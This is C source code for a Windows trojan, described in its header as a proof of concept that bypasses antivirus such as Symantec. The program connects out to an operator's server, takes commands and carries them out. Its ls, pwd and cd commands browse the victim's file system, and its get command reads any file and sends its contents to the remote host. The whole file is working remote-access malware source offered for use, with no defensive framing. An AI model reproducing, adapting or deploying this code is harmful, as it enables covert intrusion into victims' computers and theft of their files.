/*
 * POC of trojan bypassing AV like Symantec
 *
 * Coded by Kahlon81 09/2018
 */
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tchar.h> 
#include <strsafe.h>
#include <stdlib.h>
#include <stdio.h>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
/*
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
*/

#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define BUFSIZE MAX_PATH
#define MAX_CMD 100

static char sCurrentDirectory[MAX_PATH] = "C:";
static char sCurrentCommand[MAX_CMD] = "";


/*
 * Print buffer to standard output
 */
void printBuffer(char *buffer, int bufferLen) {
	for ( int i = 0; i < bufferLen; i++ )
	{
		putc( buffer[i], stdout );
	}
}


bool startsWith(const char *pre, const char *str)
{
    size_t lenpre = strlen(pre),
           lenstr = strlen(str);
    return lenstr < lenpre ? false : strncmp(pre, str, lenpre) == 0;
}

/*
 * List current directory
 */
int ls(SOCKET ConnectSocket) {
   WIN32_FIND_DATA ffd;
   LARGE_INTEGER filesize;
   TCHAR szDir[MAX_PATH];
   size_t length_of_arg;
   HANDLE hFind = INVALID_HANDLE_VALUE;
   DWORD dwError=0;
   char *sendbuf;
   int iResult;
   char dirContent[2048] = "";

   // Set directory to current directory
   char *directory = sCurrentDirectory;

   // Prepare string for use with FindFile functions.  
   // First, copy the string to a buffer, then append '\*' to the directory name.
   StringCchCopy(szDir, MAX_PATH, directory);
   StringCchCat(szDir, MAX_PATH, TEXT("\\*"));

   // Find the first file in the directory.
   hFind = FindFirstFile(szDir, &ffd);
   if (INVALID_HANDLE_VALUE == hFind) 
   {
     return dwError;
   } 
   
    // Build Directory content
	StringCchCopy(dirContent, _countof(dirContent), "");
   
   // List all the files in the directory with some info about them.
   do
   {
      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {
         //_tprintf(TEXT("  %s   <DIR>\n"), ffd.cFileName);
         
        StringCchCat(dirContent, _countof(dirContent), ffd.cFileName);
        StringCchCat(dirContent, _countof(dirContent), "    <DIR>\n");
      }
      else
      {
         filesize.LowPart = ffd.nFileSizeLow;
         filesize.HighPart = ffd.nFileSizeHigh;
         
		 //_tprintf(TEXT("  %s   %ld bytes\n"), ffd.cFileName, filesize.QuadPart);
         //_tprintf(TEXT("  %s\n"), ffd.cFileName);
         
        StringCchCat(dirContent, _countof(dirContent), ffd.cFileName);
        StringCchCat(dirContent, _countof(dirContent), "\n");
      }
   }
   while (FindNextFile(hFind, &ffd) != 0);
 
   dwError = GetLastError();
   if (dwError != ERROR_NO_MORE_FILES) 
   {
      printf("error");
   }

   FindClose(hFind);
   
    // Set buffer to directory content
    sendbuf = dirContent;
    
    // Send result to server
    iResult = send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
    	closesocket(ConnectSocket);
    	WSACleanup();
    	return 1;
    }

    printf("Result sent to server (%ld bytes)\n", iResult);


   return dwError;
}


int setCurrentDirectory() {
	TCHAR buffer[BUFSIZE];
	DWORD dwRet;
		
	dwRet = GetCurrentDirectory(BUFSIZE, buffer);
   	if( dwRet == 0 )
   	{
      	printf("GetCurrentDirectory failed (%d)\n", GetLastError());
    	return 0;
   	}
   	
   	if(dwRet > BUFSIZE)
   	{
      	printf("Buffer too small; need %d characters\n", dwRet);
    	return 0;
   	}
   	
   	StringCchCopy(sCurrentDirectory, _countof(sCurrentDirectory), buffer);
}

/*
 * Get current path
 */
int pwd(SOCKET ConnectSocket) {
	char *sendbuf = sCurrentDirectory;
	int iResult;

	 // Send result to server
    iResult = send( ConnectSocket, sendbuf, (int)strlen(sendbuf), 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
    	closesocket(ConnectSocket);
    	WSACleanup();
    	return 1;
    }

    printf("Result sent to server (%ld bytes)\n", iResult);
}


/*
 * Change current directory, cd xxx
 */
int cd(SOCKET ConnectSocket) {
	char * pch;
	int iResult;
			
	if (!startsWith("cd ", sCurrentCommand))
		return -1;
	
  	pch = sCurrentCommand + 3;
  
	if( !SetCurrentDirectory(pch))
   	{
    	printf("SetCurrentDirectory failed (%d)\n", GetLastError());
      	return 0;
   	}
   	
   	setCurrentDirectory();
   	
   	iResult = send( ConnectSocket, TEXT("OK\n"), strlen("OK\n"), 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }
    printf("Result sent to server (%d bytes)\n", iResult);
}


/*
 * Dump file, get xxx
 */
int get(SOCKET ConnectSocket) {
	FILE *fileptr;
	char *buffer;
	long filelen;
	char * pch;
	int iResult;

	if (!startsWith("get ", sCurrentCommand))
		return -1;
	
  	pch = sCurrentCommand + 4;
  	
	// Read file in binary mode
	fileptr = fopen(pch, "rb"); 
	fseek(fileptr, 0, SEEK_END); 
	filelen = ftell(fileptr);  
	rewind(fileptr);       
	buffer = (char *)malloc((filelen+1)*sizeof(char)); // Enough memory for file + \0
	fread(buffer, filelen, 1, fileptr); // Read in the entire file
	fclose(fileptr); 
	
	// Send buffer to server
    iResult = send( ConnectSocket, buffer, filelen, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
    	closesocket(ConnectSocket);
    	WSACleanup();
    	return 1;
    }

    printf("Result sent to server (%ld bytes)\n", iResult);
}

/*
 * Wait for server command
 */
 
int waitForServerCommand(SOCKET ConnectSocket) {
	char recvbuf[DEFAULT_BUFLEN];
	int recvbuflen = DEFAULT_BUFLEN;
	int iResult;
	
	iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    if ( iResult > 0 ) {
    	printf("Server commmand received (%d bytes) :\n", iResult);
        	
        // Print response from server
        //printBuffer(recvbuf, iResult);
        
        // Set current command
        memset(sCurrentCommand, '\0', sizeof(sCurrentCommand));
        strncpy(sCurrentCommand, recvbuf, iResult);
	}
    else if ( iResult == 0 )
        printf("Connection closed\n");
    else
        printf("recv failed with error: %d\n", WSAGetLastError());
        
    return iResult;
}


int __cdecl main(int argc, char **argv) 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;
   
    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;
        
    // Validate the parameters
    if (argc != 3) {
        printf("usage: %s server-name port\n");
        return 1;
    }
    
    // Set current directory
	setCurrentDirectory();

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
    if ( iResult != 0 ) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }
    
    do {
    	
    	// Wait for server command
    	iResult = waitForServerCommand(ConnectSocket);
    
    	// Print command
    	printf("%s\n", sCurrentCommand);
    	
    	if (strcmp(sCurrentCommand, "ls") == 0)
    		ls(ConnectSocket);
    	else if (strcmp(sCurrentCommand, "pwd") == 0)
    		pwd(ConnectSocket);
    	else if (startsWith("cd ", sCurrentCommand))
			cd(ConnectSocket);
		else if (startsWith("get ", sCurrentCommand))
    		get(ConnectSocket);
    		
	} while( iResult > 0 );
	
    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

    return 0;
}
